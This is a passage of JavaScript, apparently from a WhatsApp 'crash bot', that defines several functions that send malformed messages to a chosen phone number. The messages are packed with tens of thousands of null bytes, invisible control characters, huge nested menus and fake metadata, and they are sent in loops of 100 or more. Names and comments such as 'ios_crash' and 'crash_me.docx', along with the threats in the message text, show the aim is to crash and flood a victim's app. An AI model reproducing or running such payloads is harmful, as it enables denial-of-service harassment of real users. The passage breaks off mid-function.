              "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",
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(jid, message, {});

    let statusid;
    statusid = await sock.relayMessage("status@broadcast", msg.message, {
      messageId: generateRandomMessageId(),
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: jid },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage(
      jid,
      {
        message: {
          protocolMessage: {
            key: statusid.key,
            limitSharing: {
              sharingLimited: true,
              trigger: "BIZ_SUPPORTS_FB_HOSTING",
            },
            type: "PEER_DATA_OPERATION_REQUEST_RESPONSE_MESSAGE",
          },
        },
      },
      {}
    );
  } catch (err) {
    console.log(err);
  }
}
//####################################################################
async function carouselfriX(sock, jid, blonde) {
  const largeText = "you Must Die" + "ꦾ".repeat(45000);

  while (blonde) {
    try {
      for (let i = 0; i < 100; i++) {
        const section = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [{
            title: largeText,
            id: `id${i}`,
            subrows: [{
              title: "Nested row 1",
              id: `nested_id1_${i}`,
              subsubrows: [{
                title: "Deep Nested row 1",
                id: `deep_nested_id1_${i}`,
              }]
            }]
          }]
        };

        const content = proto.Message.fromObject({
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "Snithinx",
                  locationMessage: {
                    degreesLatitude: -999.035,
                    degreesLongitude: 922.999,
                    name: "🐉",
                    address: "👁",
                    jpegThumbnail: Buffer.from([]) // kosong agar valid
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: "Are You Ready To Die?"
                },
                nativeFlowMessage: {
                  messageParamsJson: "bio.link/snitch",
                  buttons: [{
                    name: "single_select",
                    buttonParamsJson: {
                      title: "Normal button",
                      sections: [section]
                    }
                  }]
                },
                contextInfo: {
                  externalAdReply: {
                    title: "You will Die" + "@1".repeat(5000),
                    body: "Lets Kill",
                    thumbnailUrl: "https://wa.msg/setting",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    showAdAttribution: true,
                    sourceUrl: "https://wa.msg/setting"
                  }
                }
              }
            }
          }
        });

        const msg = await generateWAMessageFromContent(jid, content, {
          userJid: jid,
          quoted: null
        });

        await sock.relayMessage(jid, msg.message, {
          messageId: msg.key.id
        });

        await delay(300); // tambahkan delay untuk menghindari flood
      }

    } catch (err) {
      console.error("❌ Error sending section:", err);
      break;
    }
  }
}
//####################################################################
async function iosinvis(sock, jid) {
    for (let i = 0; i < 150; i++) {
        await sock.relayMessage(jid, {
            extendedTextMessage: {
                text: 'BLACK INVISIBLE' + "\u0000".repeat(99999),
                contextInfo: {
                    groupMentions: [{ groupJid: "000000000000009@g.us", groupSubject: "⁨🔥" }],
                    stanzaId: "1234567890ABCDEF",
                    participant: "13135550002@s.whatsapp.net",
                    quotedMessage: {
                        callLogMesssage: {
                            isVideo: true,
                            callOutcome: "1",
                            durationSecs: "0",
                            callType: "REGULAR",
                            participants: [{ jid: "13135550002@s.whatsapp.net", callOutcome: "1" }]
                        }
                    },
                    remoteJid: jid,
                    conversionSource: "source_example",
                    conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                    conversionDelaySeconds: 10,
                    forwardingScore: 9999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "Example Advertiser",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "@ Você foi mencionado"
                    },
                    placeholderKey: { remoteJid: "13135550002@s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" },
                    expiration: 86400,
                    ephemeralSettingTimestamp: "1728090592378",
                    ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                    externalAdReply: {
                        title: "@ Você foi mencionado",
                        body: "@ Você foi mencionado",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewTtpe: "VIDEO",
                        thumbnail: null,
                        sourceType: " x ",
                        sourceId: " x ",
                        sourceUrl: "https://instagram.com/6u.cg",
                        mediaUrl: "https://instagram.com/6u.cg",
                        containsAutoReply: true,
                        renderLargerThumbnail: true,
                        showAdAttribution: true,
                        ctwaClid: "ctwa_clid_example",
                        ref: "ref_example"
                    },
                    entryPointConversionSource: "entry_point_source_example",
                    entryPointConversionApp: "entry_point_app_example",
                    entryPointConversionDelaySeconds: 5,
                    disappearingMode: {},
                    actionLink: { url: "https://instagram.com/6u.cg" },
                    groupSubject: "Pwq",
                    parentGroupJid: "8888888888888-1234567890@g.us",
                    trustBannerType: "trust_banner_example",
                    trustBannerAction: 1,
                    isSampled: false,
                    utm: { utmSource: "utm_source_example", utmCampaign: "utm_campaign_example" },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "8888888888888-1234567890@g.us",
                        serverMessageId: 1,
                        newsletterName: " X ",
                        contentType: "UPDATE",
                        accessibilityText: "X"
                    },
                    businessMessageForwardInfo: { businessOwnerJid: "0@s.whatsapp.net" },
                    smbClientCampaignId: "smb_client_campaign_id_example",
                    smbServerCampaignId: "smb_server_campaign_id_example",
                    dataSharingContext: { showMmDisclosure: true }
                }
            }
        }, { participant: { jid: jid } }); 
    }
}
//####################################################################

async function overbutton(sock, jid, Ptcp = true) {
      await sock.relayMessage(
        jid,
        {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "notblek",
                  format: "EXTENSIONS_1",
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Èl Hereϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"womp womp\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑‌▾ fuckyu‌${"\u0000".repeat(
                    55000
                  )}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                  version: 3,
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: jid,
              },
            }
          : {}
      );
    }
//####################################################################
async function iosOverAttackExtreme(sock, jid) {
  const payload = "\u200F".repeat(5000) + "\u2066".repeat(5000) + "\u0000".repeat(60000) + "@".repeat(200) + "BY @vDzee";
  const Ptcp = { participant: { jid } };

  for (let i = 0; i < 100; i++) {
    // 1. ExtendedTextMessage (corrupt context)
    await sock.relayMessage(jid, {
      extendedTextMessage: {
        text: payload,
        contextInfo: {
          forwardingScore: 999999,
          isForwarded: true,
          stanzaId: "WTF" + Math.random(),
          participant: "0@s.whatsapp.net",
          quotedMessage: {
            imageMessage: {
              mimetype: "image/jpeg",
              caption: payload,
              jpegThumbnail: Buffer.alloc(100000, 0),
            }
          },
          externalAdReply: {
            title: "💣attacked BY DZEEEEE",
            body: payload,
            mediaType: "VIDEO",
            thumbnail: Buffer.alloc(100000, 0),
            mediaUrl: "https://instagram.com/6u.cg",
            sourceUrl: "https://instagram.com/6u.cg",
            renderLargerThumbnail: true,
            showAdAttribution: true
          }
        }
      }
    }, Ptcp);

    // 2. Interactive ViewOnce (deep native flow abuse)
    await sock.relayMessage(jid, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "ios_crash",
              format: "EXTENSIONS_1"
            },
            nativeFlowResponseMessage: {
              name: "💀_ios_overflow",
              paramsJson: JSON.stringify({
                "screen_0_TextInput_0": payload,
                "screen_0_TextInput_1": "CRITICAL",
                "screen_0_Dropdown_2": "001-DeadZone",
                "screen_1_TextInput_2": "💀💥",
                "screen_1_TextInput_3": payload,
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "flow_token": "AAA.CCCCC.DEAD.TOKEN",
              }),
              version: 9
            }
          }
        }
      }
    }, Ptcp);

    // 3. DocumentMessage dengan metadata besar
    await sock.relayMessage(jid, {
      documentMessage: {
        title: `🧨 Doc Attack BY @vDzee`,
        fileName: "crash_me.docx",
        mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        fileLength: "9999999",
        caption: payload,
        pageCount: 9999,
        fileSha256: Buffer.alloc(32),
        fileEncSha256: Buffer.alloc(32),
        mediaKey: Buffer.alloc(32),
        mediaKeyTimestamp: Date.now(),
        jpegThumbnail: Buffer.alloc(100000, 0)
      }
    }, Ptcp);

    // 4. TemplateMessage dengan tombol spam
